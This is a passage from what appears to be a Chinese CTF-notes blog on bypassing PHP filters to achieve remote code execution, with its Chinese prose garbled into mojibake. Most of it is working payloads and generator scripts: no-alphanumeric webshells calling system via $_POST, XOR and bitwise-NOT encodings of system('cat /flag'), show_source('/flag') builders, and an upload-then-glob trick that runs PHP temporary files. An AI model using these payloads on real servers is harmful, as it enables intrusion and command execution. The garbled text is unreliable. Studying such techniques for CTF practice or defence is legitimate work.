class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span> <span class="comment">#åŒå¼•å·å¯æ¢å•å¼•å·</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure></li><li><p><code>++</code>è¿ç®—è‡ªå¢æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=(_/_._)[<span class="number">0</span>];<span class="comment">//ç›´æ¥æ‹¼æ¥æˆå­—ç¬¦ä¸²å¹¶åˆ‡ç‰‡</span></span><br><span class="line"><span class="variable">$o</span>=++<span class="variable">$a</span>;<span class="comment">//$o=++$aæ˜¯å…ˆæŠŠ$aè¿›è¡Œè‡ªå¢ï¼Œè‡ªå¢å®Œæˆä¹‹åå†å°†å€¼è¿”å›ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€å¥ç»“æŸçš„æ—¶å€™ $aå’Œ$oéƒ½æ˜¯O</span></span><br><span class="line"><span class="variable">$o</span>=++<span class="variable">$a</span>.<span class="variable">$o</span>;<span class="comment">//$o=&gt;PO,$a=&gt;P</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="comment">//Q</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$o</span>.=++<span class="variable">$a</span>;<span class="comment">//$o=&gt;POS,$a=&gt;S</span></span><br><span class="line"><span class="variable">$o</span>.=++<span class="variable">$a</span>;<span class="comment">//$o=&gt;POST,$a=&gt;T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$o</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[0]($_POST[_]);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Payload:</span></span><br><span class="line"><span class="comment">//code=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=id</span></span><br><span class="line"><span class="comment">//code=$_=(_/_._)[_];$_++;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);&amp;_POST=system&amp;_=id</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: é¢–å¥‡L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">payload, buff</span>):</span><br><span class="line">	offset = <span class="number">3</span> + buff</span><br><span class="line">	res = <span class="string">&quot;&quot;</span></span><br><span class="line">	base = <span class="number">65</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		_<span class="built_in">ascii</span> = <span class="built_in">ord</span>(payload[i])</span><br><span class="line">		<span class="comment">#init</span></span><br><span class="line">		underline =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">		undefined = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (<span class="built_in">len</span>(payload) + offset + <span class="number">15</span>))</span><br><span class="line">		var = <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;$__-=<span class="subst">&#123;underline&#125;</span>;$__++;<span class="subst">&#123;underline&#125;</span>/=$__;<span class="subst">&#123;underline&#125;</span>=((<span class="subst">&#123;undefined&#125;</span>/<span class="subst">&#123;undefined&#125;</span>).<span class="subst">&#123;underline&#125;</span>)&quot;</span>+<span class="string">r&quot;&#123;++$__&#125;;$__--;&quot;</span></span><br><span class="line">		res += var;</span><br><span class="line">		tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> _<span class="built_in">ascii</span> &gt; base:</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(_<span class="built_in">ascii</span>-base):</span><br><span class="line">				tmp = tmp + <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;&quot;</span></span><br><span class="line">		res += tmp</span><br><span class="line"></span><br><span class="line">	first =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * offset)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(payload)):</span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">			res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;_&#x27;;&quot;</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">			res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;/&#x27;;&quot;</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		final_var = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">		res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=<span class="subst">&#123;final_var&#125;</span>;&quot;</span></span><br><span class="line">	<span class="keyword">return</span> [res, <span class="string">&quot;$&quot;</span> + <span class="string">&quot;_&quot;</span> * (offset)]</span><br><span class="line"></span><br><span class="line">pre = <span class="string">&quot;&#x27;&#x27;);&quot;</span></span><br><span class="line">after = <span class="string">&#x27;//&#x27;</span></span><br><span class="line"></span><br><span class="line">buff = <span class="built_in">len</span>(<span class="string">&#x27;STRTOLOWERSHOW_SOURCE&#x27;</span>)</span><br><span class="line">flag = g(<span class="string">&quot;/FLAG&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="built_in">len</span>(<span class="string">&#x27;STRTOLOWER&#x27;</span>)</span><br><span class="line">showsource = g(<span class="string">&quot;SHOW_SOURCE&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="number">0</span></span><br><span class="line">strtolower = g(<span class="string">&#x27;STRTOLOWER&#x27;</span>, buff)</span><br><span class="line"></span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.æ„é€ STRTOLOWERå¹¶å­˜è¿›å˜é‡a</span></span><br><span class="line">final += strtolower[<span class="number">0</span>]</span><br><span class="line">a = strtolower[<span class="number">1</span>] <span class="comment"># a = &#x27;$___&#x27; # STRTOLOWER</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.æ„é€ SHOW_SOURCEå¹¶å­˜è¿›å˜é‡b</span></span><br><span class="line">final += showsource[<span class="number">0</span>]</span><br><span class="line">b = showsource[<span class="number">1</span>] <span class="comment"># b = &#x27;$_____________&#x27; #SHOW_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.æ„é€ /FLAGå¹¶å­˜è¿›å˜é‡c</span></span><br><span class="line">final += flag[<span class="number">0</span>] + flag[<span class="number">1</span>] + <span class="string">&quot;=&#x27;/&#x27;.&quot;</span> + flag[<span class="number">1</span>] + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">c = flag[<span class="number">1</span>] <span class="comment"># c = &#x27;$________________________&#x27; #/FLAG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å£°æ˜å¥½abcå˜é‡</span></span><br><span class="line">padding = <span class="string">f&#x27;$______________________________________________=<span class="subst">&#123;a&#125;</span>;$_______________________________________________=<span class="subst">&#123;b&#125;</span>;$________________________________________________=<span class="subst">&#123;c&#125;</span>;&#x27;</span></span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.å˜é‡d = a(c) åˆ™å˜é‡dä¸º/flag</span></span><br><span class="line">d = <span class="string">&quot;$______________________________________________($________________________________________________);&quot;</span></span><br><span class="line">padding = <span class="string">&#x27;$_________________________________________________=&#x27;</span>+d</span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment">#5. b(d) å³ä¸ºSHOW_SOURCE(&#x27;/flag&#x27;)</span></span><br><span class="line">final += <span class="string">&#x27;$_______________________________________________($_________________________________________________);&#x27;</span></span><br><span class="line"></span><br><span class="line">final = pre + final</span><br><span class="line">final = final + after</span><br><span class="line"><span class="built_in">print</span>(final.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å…³é”®å­—æ„é€ </span></span><br><span class="line"><span class="comment">#$_GET[0]($_GET[1]);</span></span><br><span class="line">need = <span class="string">&#x27;GET&#x27;</span></span><br><span class="line"></span><br><span class="line">alpha = <span class="built_in">list</span>(<span class="built_in">set</span>(need))</span><br><span class="line">alpha.sort()</span><br><span class="line"><span class="built_in">print</span>(alpha)</span><br><span class="line">greece = <span class="string">&#x27;Î± Î² Î³ Î´ Îµ Î¶ Î½ Î¾ Î¿ Ï€ Ï Ïƒ Î· Î¸ Î¹ Îº Î» Î¼ Ï„ Ï… Ï† Ï‡ Ïˆ Ï‰ Î“ Î”&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;$_=C;&#x27;</span></span><br><span class="line">cnt = <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> alpha:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">		now_php = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(k)-cnt):</span><br><span class="line">			now_php += <span class="string">&#x27;$_++;&#x27;</span></span><br><span class="line">			cnt += <span class="number">1</span></span><br><span class="line">		icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">		now_php += <span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>=$_;&#x27;</span></span><br><span class="line">		out += now_php</span><br><span class="line"></span><br><span class="line">func = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> need:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">		icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">		func += [<span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>&#x27;</span>]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		func += [k]</span><br><span class="line">func = <span class="string">&#x27;.&#x27;</span>.join(func)</span><br><span class="line"><span class="built_in">print</span>(func)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;<span class="subst">&#123;out&#125;</span>?&gt;&lt;?=($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[0])($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[1]);&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä¸Šä¼ +æ‰§è¡Œ</p><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯<code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚</p><p>æ‰§è¡Œ<code>. /tmp/phpXXXXXX</code>ï¼Œä¹Ÿæ˜¯æœ‰å­—æ¯çš„ã€‚æ­¤æ—¶å°±å¯ä»¥ç”¨åˆ°Linuxä¸‹çš„globé€šé…ç¬¦ï¼š</p><ul><li><code>*</code>å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦</li><li><p><code>?</code>å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦</p><p>é‚£ä¹ˆï¼Œ<code>/tmp/phpXXXXXX</code>å°±å¯ä»¥è¡¨ç¤ºä¸º<code>/*/?????????</code>æˆ–<code>/???/?????????</code>ã€‚</p><p>ä½†æ˜¯ï¼Œåœ¨æ‰§è¡Œç¬¬ä¸€ä¸ªåŒ¹é…ä¸Šçš„æ–‡ä»¶çš„æ—¶å€™å°±å·²ç»å‡ºç°äº†é”™è¯¯ï¼Œå¯¼è‡´æ•´ä¸ªæµç¨‹åœæ­¢ï¼Œæ ¹æœ¬ä¸ä¼šæ‰§è¡Œåˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><p>globé€šé…ç¬¦æ”¯æŒç”¨<code>[^x]</code>çš„æ–¹æ³•æ¥æ„é€ â€œè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€ã€‚å¯ä»¥åˆ©ç”¨<code>[@-[]</code>æ¥è¡¨ç¤ºå¤§å†™å­—æ¯ã€‚å½“ç„¶ï¼Œphpç”Ÿæˆä¸´æ—¶æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸ä¸€å®šæ˜¯å¤§å†™å­—æ¯ï¼Œä¸è¿‡å¤šå°è¯•å‡ æ¬¡ä¹Ÿå°±è¡Œäº†ã€‚</p><p><strong>POSTä¸Šä¼ æ–‡ä»¶æ•°æ®åŒ…</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;POSTæ•°æ®åŒ…POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;æ–‡ä»¶åï¼š&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¼ æ–‡ä»¶<code>1.php</code>å†…å®¹æ·»åŠ <strong>shå‘½ä»¤</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æŠ“åŒ…ï¼Œæ„é€ <strong>pocæ‰§è¡Œå‘½ä»¤</strong>ï¼š</p><p><code>?c=./???/????????[@-[]</code></p></li></ul></li><li><p>é€šé…ç¬¦ï¼ˆä»…æ— å­—æ¯ï¼‰</p><p>base64: <code>/???/????64 ????.???</code></p><p>bzip2: <code>/???/???/????2 ????.???</code></p></li><li><p><code>[~(å¼‚æˆ–)][!%FF]</code>å½¢å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:].upper()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ç»„æˆç±»ä¼¼äºsystem(pos(next(getallheaders())));å³å¯</span></span><br><span class="line"><span class="string">a=whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&quot;:&gt;&quot;</span>).strip(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure></li><li><p>evalå‡½æ•°ä¸‹</p><ul><li><p>å­—ç¬¦ä¸²æ‹¼æ¥</p><p><code>a=(s.y.s.t.e.m)(&#39;cat /flag&#39;);</code></p></li><li><p>è¿›åˆ¶ç¼–ç </p><p><code>a=hex2bin(&#39;73797374656d&#39;)(&#39;cat /flag&#39;);</code></p></li><li><p>å¼‚æˆ–</p><p><code>a=(&#39;0000000&#39;^&#39;CICDU]&#39;)(&#39;cat /flag&#39;);</code></p><p><code>a=(&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;);</code></p></li><li><p>å¥—å¨ƒ</p><p><code>a=eval($_POST[1]);&amp;1=phpinfo();</code></p></li></ul></li><li><p>çº¯æ•°å­—æ„é€ ï¼ˆLinuxç³»ç»Ÿçº§ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$((<span class="variable">$&#123;_&#125;</span>))</span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">$((~$((<span class="variable">$&#123;_&#125;</span>))))</span><br><span class="line"><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line">$((~$(($((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))))))</span><br><span class="line"><span class="comment">#36</span></span><br><span class="line"><span class="comment">#å»+å·ä¹Ÿå¯</span></span><br><span class="line"></span><br><span class="line">$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br><span class="line"><span class="comment">#36	</span></span><br><span class="line"><span class="comment">#å»+å·ä¹Ÿå¯</span></span><br></pre></td></tr></table></figure></li></ul><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">CTFshow-RCEæé™å¤§æŒ‘æˆ˜</a></p><p><a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow-å‘¨æœ«å¤§æŒ‘æˆ˜</a></p><p>â€‹</p><h3 id="æ— å‚æ•°-å¸¦å‚æ•°RCE"><a href="#æ— å‚æ•°-å¸¦å‚æ•°RCE" class="headerlink" title="æ— å‚æ•°/å¸¦å‚æ•°RCE"></a>æ— å‚æ•°/å¸¦å‚æ•°RCE</h3><h4 id="æ— å‚å‡½æ•°"><a href="#æ— å‚å‡½æ•°" class="headerlink" title="æ— å‚å‡½æ•°"></a>æ— å‚å‡½æ•°</h4><ul><li><p>phpinfo()</p></li><li><p>phpversion()</p><p><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) -&gt; .</code></p><p><code>chr(ord(hebrevc(crypt(phpversion())))) -&gt; .</code></p></li><li><p>localeconv()</p><p>è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ 